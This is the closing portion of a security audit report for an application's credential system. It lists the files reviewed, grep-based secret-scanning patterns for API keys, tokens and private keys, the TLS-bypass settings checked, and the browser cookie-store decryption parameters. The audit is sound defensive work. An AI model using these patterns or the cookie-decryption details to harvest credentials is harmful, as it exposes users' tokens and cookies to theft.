| `src/server/panelHttpServer.ts` | Loader + bundle serving + cache headers |
| `src/main/remoteCredentialStore.ts` | Remote admin-token `safeStorage` |
| `src/main/services/remoteCredService.ts` | Remote-server creds RPC / TOFU |
| `src/main/tlsPinning.ts` | Fingerprint pinning primitives |
| `src/main/serverClient.ts` | WebSocket client with TLS pinning |
| `packages/shared/src/credentials/store.ts` | Plaintext JSON credential store |
| `packages/shared/src/credentials/consent.ts` | SQLite-backed consent grants |
| `packages/shared/src/credentials/audit.ts` | Append-only JSONL audit log |
| `packages/shared/src/credentials/registry.ts` | Provider manifest registry |
| `packages/shared/src/credentials/refresh.ts` | Token refresh scheduler |
| `packages/shared/src/credentials/flows/loopbackPkce.ts` | PKCE flow runner |
| `packages/shared/src/credentials/providers/google.ts` | Google manifest |
| `packages/shared/src/credentials/providers/github.ts` | GitHub manifest |
| `packages/shared/src/centralAuth.ts` | Admin-token on disk |
| `packages/shared/src/workspace/loader.ts` | `.secrets.yml` / central config |
| `packages/shared/src/redact.ts` | Token redaction helper |
| `packages/auth-flow/src/providers/openaiCodex.ts` | Client-side OAuth |
| `packages/auth-flow/src/index.ts` | Auth-flow package surface |
| `apps/webhook-relay/src/index.ts` | Webhook relay (stub) |
| `apps/webhook-relay/wrangler.toml` | Relay Cloudflare config |
| `apps/mobile/src/services/auth.ts` | Shell token in Keychain |
| `apps/mobile/src/services/credentialConsent.ts` | Mobile consent bridge |
| `apps/mobile/src/components/PanelWebView.tsx` | WebView panelInit plumbing |
| `docs/credential-system.md` | Design doc |
| `docs/writing-a-provider-manifest.md` | Manifest authoring guide |
| `docs/config-example.yml` | Config example |

## Appendix B — Scans performed

- `grep -rE "sk_live|AKIA|BEGIN (RSA |EC |DSA )?PRIVATE KEY|xoxb-|xoxp-|ghp_|gho_|ghu_|github_pat_"` against `src/`, `packages/`, `apps/`, `docs/`.
  Only hits were `xoxb-test-bot-token` in test fixtures + placeholders
  (`PLACEHOLDER_GOOGLE_CLIENT_ID`, `PLACEHOLDER_GITHUB_CLIENT_ID`).
- `git log --all -p | grep -iE 'api[_-]?key|password=|secret='` — no leaked
  credentials; hits are legit code paths around env-var names
  (`ANTHROPIC_API_KEY`, `COMPOSIO_API_KEY`) or documentation strings.
- `grep -rE "Sentry|bugsnag|captureException"` in product code paths → no
  hits outside node_modules. Good: tokens aren't being shipped to a
  third-party error-reporting service.
- `grep -rE "rejectUnauthorized: false|trustBrowserCas"` — hits are the
  fingerprint-pinning socket (intentional, safe), the health probe (TOFU
  path), and workerd's network service (`trustBrowserCas: true` — which
  delegates to the system CA store for outbound worker fetches; fine).

## Appendix C — Not covered / recommended future audits

- Runtime behaviour: a dynamic test-run of the egress proxy confirming F-03
  (send crafted headers; observe upstream bearer).
- Cross-platform `safeStorage` fallback paths on headless Linux
  (F-10).
- Mobile universal-link hijack surface on real iOS / Android devices
  (F-13).
- `server-native` — not inspected beyond confirming it ships no custom
  secret-handling code (contents are npm `node_modules` only).
- `packages/browser-data/` — uses the documented Chromium / Firefox legacy
  crypto (`pbkdf2-sha1` @ 1 iter, fixed salt `saltysalt`). That is the
  public spec for reading existing browsers' cookie stores, not NatStack's
  own crypto. Out of scope.
